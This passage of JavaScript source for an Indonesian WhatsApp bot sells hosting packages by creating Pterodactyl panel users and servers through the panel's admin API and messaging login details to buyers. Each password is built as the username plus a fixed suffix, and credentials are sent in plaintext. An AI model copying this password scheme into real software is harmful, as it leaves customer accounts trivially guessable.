let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "By TDS4YOU"
let egg = global.eggsnya
let loc = global.location
let memo = "6000"
let cpu = "450"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/5f441449176f49ca93d4a.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "0011"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}
⎙─➤ *😎PEMILIK SERVER* : *${namaCreator}*

*TUTOR BUAT PANEL DI ADMIN PANEL :*
https://youtu.be/ukYdr_FfVI4

*TUTOR RUN BOT DI PANEL :*
https://youtu.be/-XKfz5Xzqt4

*GRUP OWNER :*
https://chat.whatsapp.com/ECx4Cm22AA6KPTqnh1XH9j

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}
minSaldo(sender, 12000, db_saldo)
break
case "srvpaket8": {
       if (cekSaldo(sender,db_saldo) < 13000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp13.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "By TDS4YOU"
let egg = global.eggsnya
let loc = global.location
let memo = "7000"
let cpu = "400"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/5f441449176f49ca93d4a.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "0011"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}
⎙─➤ *😎PEMILIK SERVER* : *${namaCreator}*

*TUTOR BUAT PANEL DI ADMIN PANEL :*
https://youtu.be/ukYdr_FfVI4

*TUTOR RUN BOT DI PANEL :*
https://youtu.be/-XKfz5Xzqt4

*GRUP OWNER :*
https://chat.whatsapp.com/ECx4Cm22AA6KPTqnh1XH9j

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}
minSaldo(sender, 13000, db_saldo)
break
case "srvpaket9": {
       if (cekSaldo(sender,db_saldo) < 14000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp14.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "By TDS4YOU"
let egg = global.eggsnya
let loc = global.location
let memo = "8000"
let cpu = "450"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/5f441449176f49ca93d4a.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "0011"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}
⎙─➤ *😎PEMILIK SERVER* : *${namaCreator}*

*TUTOR BUAT PANEL DI ADMIN PANEL :*
https://youtu.be/ukYdr_FfVI4

*TUTOR RUN BOT DI PANEL :*
https://youtu.be/-XKfz5Xzqt4

*GRUP OWNER :*
https://chat.whatsapp.com/ECx4Cm22AA6KPTqnh1XH9j

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}
minSaldo(sender, 14000, db_saldo)
break
case "srvpaket10": {
       if (cekSaldo(sender,db_saldo) < 15000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp15.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "By TDS4YOU"
let egg = global.eggsnya
let loc = global.location
let memo = "9000"
let cpu = "500"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/5f441449176f49ca93d4a.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "0011"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}
⎙─➤ *😎PEMILIK SERVER* : *${namaCreator}*

*TUTOR BUAT PANEL DI ADMIN PANEL :*
https://youtu.be/ukYdr_FfVI4

*TUTOR RUN BOT DI PANEL :*
https://youtu.be/-XKfz5Xzqt4

*GRUP OWNER :*
https://chat.whatsapp.com/ECx4Cm22AA6KPTqnh1XH9j

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}
minSaldo(sender, 15000, db_saldo)
break
            case 'suspend': {
            if (!isOwner) return reply(`Khusus RIDZ STORE Aja`)
            let srv = args[0]
            if (!srv) return reply('ID nya mana?')
            let f = await fetch(domain + "/api/application/servers/" + srv + "/suspend", {
                "method": "POST",
                "headers": {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikey
                }
            })
            let res = f.ok ? {
                errors: null
            } : await f.json()
            if (res.errors) return reply('*SERVER NOT FOUND*')
            reply('*BERHASIL SUSPEND..*')
        }
            break
            case 'unsuspend': {
            if (!isOwner) return reply(`Khusus RIDZ STORE Aja`)
            let srv = args[0]
            if (!srv) return reply('ID nya mana?')
            let f = await fetch(domain + "/api/application/servers/" + srv + "/unsuspend", {
                "method": "POST",
                "headers": {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikey
                }
            })
            let res = f.ok ? {
                errors: null
            } : await f.json()
            if (res.errors) return reply('*SERVER NOT FOUND*')
           reply('*BERHASIL BUKA SUSPEND..*')
        }
            break
case "1gb": {
    if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "RIDZ STORE"
let egg = global.eggsnya
let loc = global.location
let memo = "1000"
let cpu = "10"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/5f441449176f49ca93d4a.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`DONE BY RIDZ STORE⚡

 *DONE CRATE USER + SERVER ID :* ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

 *======[ 𝘽𝙀𝙍𝙄𝙆𝙐𝙏 𝘼𝘿𝘼𝙇𝘼𝙃 𝘿𝘼𝙏𝘼 𝙋𝘼𝙉𝙀𝙇 𝘼𝙉𝘿𝘼 ]======*\n

͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏
⎙─➣ 𝘐𝘋 : ${user.id}
⎙─➣ 𝘌𝘮𝘢𝘪𝘭 : ${user.email}
⎙─➣ 𝘜𝘴𝘦𝘳𝘯𝘢𝘮𝘦 : ${user.username}
⎙─➣ 𝑃𝑎𝑠𝑠𝑤𝑜𝑟𝑑 : ${password}
⎙─➣𝐿𝑖𝑛𝑘 𝐿𝑜𝑔𝑖𝑛 : ${domain}
⎙─➣ 𝑃𝑒𝑚𝑖𝑙𝑖𝑘 𝑆𝑒𝑟𝑣𝑒𝑟 : RIDZ STORE

𝙏𝙐𝙏𝙊𝙍 𝙍𝙐𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝘼𝙉𝙀𝙇 : https://drive.google.com/file/d/1CL7-jCXy2sZmVeKDAo5FYmr1OjvkUhGZ/view?usp=drivesdk

𝙒𝙀𝘽 𝙊𝙒𝙉𝙀𝙍 : https://lynk.id/tds4youshop 

𝙂𝙍𝙐𝙋 𝙊𝙒𝙉𝙀𝙍 : https://chat.whatsapp.com/ECx4Cm22AA6KPTqnh1XH9j
▰▱▰▱▰▱▰▱▰▱▰▱▰▰▱▰▱▰▱▰▱
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
𝐃𝐎𝐍𝐄 𝐒𝐈𝐋𝐀𝐇𝐊𝐀𝐍 𝐂𝐄𝐊 𝐃𝐀𝐓𝐀 𝐀𝐊𝐔𝐍 𝐏𝐀𝐍𝐄𝐋 𝐀𝐍𝐃𝐀 𝐒𝐔𝐃𝐀𝐇 𝐓𝐄𝐑𝐊𝐈𝐑𝐈𝐌 𝐊𝐄 𝐍𝐎𝐌𝐎𝐑 𝐓𝐄𝐑𝐒𝐄𝐁𝐔𝐓 ☑️
© Cs RIDZ STORE
`)

}

break
case "2gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "RIDZ STORE"
let egg = global.eggsnya
let loc = global.location
let memo = "2000"
let cpu = "200"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/5f441449176f49ca93d4a.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

*======[ 𝘽𝙀𝙍𝙄𝙆𝙐𝙏 𝘼𝘿𝘼𝙇𝘼𝙃 𝘿𝘼𝙏𝘼 𝙋𝘼𝙉𝙀𝙇 𝘼𝙉𝘿𝘼 ]======*\n

